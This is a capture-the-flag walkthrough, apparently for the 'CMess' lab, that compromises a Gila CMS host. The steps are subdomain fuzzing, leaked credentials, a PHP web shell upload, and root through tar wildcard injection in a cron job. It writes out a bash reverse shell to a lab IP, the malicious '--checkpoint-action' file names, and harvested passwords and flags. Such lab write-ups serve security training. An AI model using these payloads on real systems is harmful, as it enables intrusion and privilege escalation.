# ENUMERATION
---



## OPEN PORTS
---


| PORT | SERVICE |
| :--- | :------ |
| 22 | SSH |
| 80 | HTTP |



# RECONNAISSANCE
---

We need to add `cmess.thm` to `/etc/hosts`:

```
echo 'IP cmess.thm' | sudo tee -a /etc/hosts
```


Let's check the web application:

![Pasted image 20250428141314.png](../../IMAGES/Pasted%20image%2020250428141314.png)


Let's fuzz for subdomains and directories:

```
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://10.10.42.25 -H "Host: FUZZ.cmess.thm" -mc 200,301,302 -fw 522 -t 100 -ic -c

 /'___\ /'___\ /'___\
 /\ \__/ /\ \__/ __ __ /\ \__/
 \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
 \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
 \ \_\ \ \_\ \ \____/ \ \_\
 \/_/ \/_/ \/___/ \/_/

 v2.1.0-dev
________________________________________________

 :: Method : GET
 :: URL : http://10.10.42.25
 :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header : Host: FUZZ.cmess.thm
 :: Follow redirects : false
 :: Calibration : false
 :: Timeout : 10
 :: Threads : 100
 :: Matcher : Response status: 200,301,302
 :: Filter : Response words: 522
________________________________________________

dev [Status: 200, Size: 934, Words: 191, Lines: 31, Duration: 873ms]
```

We found a `dev.cmess.thm` subdomain, let's add it to `/etc/hosts` and take a look:

![Pasted image 20250428142150.png](../../IMAGES/Pasted%20image%2020250428142150.png)

We got a log, which reveals credentials, at the fuzzing for directories, I found a `/login` page, let's use them here:

```
andre@cmess.thm:KPFTN_f2yxe% 
```

![Pasted image 20250428142256.png](../../IMAGES/Pasted%20image%2020250428142256.png)


![Pasted image 20250428142315.png](../../IMAGES/Pasted%20image%2020250428142315.png)

We get redirected back to the home page, we get two cookies assigned:

```
GSESSIONID
PHPSESSID
```

With this, we can search for an exploit regarding `Gila CMS`:

![Pasted image 20250428142441.png](../../IMAGES/Pasted%20image%2020250428142441.png)

We got `Authenticated RCE`, this may be our way, let's proceed with exploitation.



# EXPLOITATION
---

The vulnerability in Gila CMS 1.10.9 allows authenticated attackers to execute arbitrary code on the target server by exploiting insufficient file validation in the file manager. After logging in with valid admin credentials, an attacker can upload a malicious PHP file (e.g.,`shell.php7`) to the`tmp/` directory via the`/fm/upload` endpoint. The CMS does not properly restrict file types, enabling the upload of a web shell containing`<?php system($_GET["cmd"]);?>`, which executes OS commands via the`cmd` parameter.


Exploit: https://www.exploit-db.com/exploits/51569



Let's get the exploit and try to use it with our credentials:


![Pasted image 20250428142643.png](../../IMAGES/Pasted%20image%2020250428142643.png)

If we check our listener:

![Pasted image 20250428142656.png](../../IMAGES/Pasted%20image%2020250428142656.png)

We got our shell, let's begin privilege escalation:

# PRIVILEGE ESCALATION
---

First thing to do is to stabilize our shell:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
/usr/bin/script -qc /bin/bash /dev/null
CTRL + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export BASH=bash
```

![Pasted image 20250428142942.png](../../IMAGES/Pasted%20image%2020250428142942.png)

If we check `config.php`:

```bash
www-data@cmess:/var/www/html$ cat config.php
<?php

$GLOBALS['config'] = array (
 'db' =>
 array (
 'host' => 'localhost',
 'user' => 'root',
 'pass' => 'r0otus3rpassw0rd',
 'name' => 'gila',
 ),
 'permissions' =>
 array (
 1 =>
 array (
 0 => 'admin',
 1 => 'admin_user',
 2 => 'admin_userrole',
 ),
 ),
 'packages' =>
 array (
 0 => 'blog',
 ),
 'base' => 'http://cmess.thm/gila/',
 'theme' => 'gila-blog',
 'title' => 'Gila CMS',
 'slogan' => 'An awesome website!',
 'default-controller' => 'blog',
 'timezone' => 'America/Mexico_City',
 'ssl' => '',
 'env' => 'pro',
 'check4updates' => 1,
 'language' => 'en',
 'admin_email' => 'andre@cmess.thm',
 'rewrite' => true,
);
```

I tried this credentials for `andre` at ssh, but no luck, let's keep searching then, if we look at `/tmp` directory, we can find this:

```bash
www-data@cmess:/tmp$ ls -la
total 40
drwxrwxrwt 9 root root 4096 Apr 28 12:34 .
drwxr-xr-x 22 root root 4096 Feb 6 2020 ..
drwxrwxrwt 2 root root 4096 Apr 28 12:04 .ICE-unix
drwxrwxrwt 2 root root 4096 Apr 28 12:04 .Test-unix
drwxrwxrwt 2 root root 4096 Apr 28 12:04 .X11-unix
drwxrwxrwt 2 root root 4096 Apr 28 12:04 .XIM-unix
drwxrwxrwt 2 root root 4096 Apr 28 12:04 .font-unix
drwxrwxrwt 2 root root 4096 Apr 28 12:04 VMwareDnD
-rw-r--r-- 1 root root 161 Apr 28 12:34 andre_backup.tar.gz
prw-r--r-- 1 www-data www-data 0 Apr 28 12:34 f
drwx------ 3 root root 4096 Apr 28 12:04 systemd-private-6033f99b25c2444da8095121db6b89ec-systemd-timesyncd.service-owkn4D
```

There is a `andre_backup.tar.gz` file, let's get it in our machine to check if it got some credentials in it:

![Pasted image 20250428143653.png](../../IMAGES/Pasted%20image%2020250428143653.png)

We get a file named `note`:

```
head -n 30 note
Note to self.
Anything in here will be backed up!
```

Seems like there is a directory where things get backed up, let's use linpeas to check if its true:

![Pasted image 20250428150004.png](../../IMAGES/Pasted%20image%2020250428150004.png)

There is a `password.bak` located at `/opt`, let's check it out:

```
www-data@cmess:/tmp$ cat /opt/.password.bak
andres backup password
UQfsdCB7aAP6
```

Let's switch to ssh:

```
andre:UQfsdCB7aAP6
```

![Pasted image 20250428151659.png](../../IMAGES/Pasted%20image%2020250428151659.png)

```
andre@cmess:~$ cat user.txt
thm{c529b5d5d6ab6b430b7eb1903b2b5e1b}
```


If we use linpeas again, we can notice this:

![Pasted image 20250428152151.png](../../IMAGES/Pasted%20image%2020250428152151.png)

```
*/2 * * * * root cd /home/mandre/backup && tar -zcf /tmp/andre_backup.tar.gz *
```

We got a cronjob which runs each 2 minutes, visualizing the format of this, we can notice it is vulnerable to `wildcard injection`, let's do the following in order to get a root shell:

1. Create a `shell.sh` file inside of `/home/andre/backup`:

```bash
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/10.6.34.159/9001 0>&1'
```

2. Craft the malicious `filenames` to get RCE:

```
echo "" > "--checkpoint=1" 
echo "" > "--checkpoint-action=exec=sh shell.sh"
chmod +x shell.sh
```

- `--checkpoint=1`: Forces`tar` to trigger a checkpoint
- `--checkpoint-action=exec=...`: Executes`shell.sh` when the checkpoint is reached.

3. Start our listener and wait for the shell:

![Pasted image 20250428152829.png](../../IMAGES/Pasted%20image%2020250428152829.png)

![Pasted image 20250428152834.png](../../IMAGES/Pasted%20image%2020250428152834.png)

There we go, we got root, let's read our final flag and end the CTF:

```
root@cmess:/home/andre/backup# cat /root/root.txt
thm{9f85b7fdeb2cf96985bf5761a93546a2}
```


![Pasted image 20250428152914.png](../../IMAGES/Pasted%20image%2020250428152914.png)


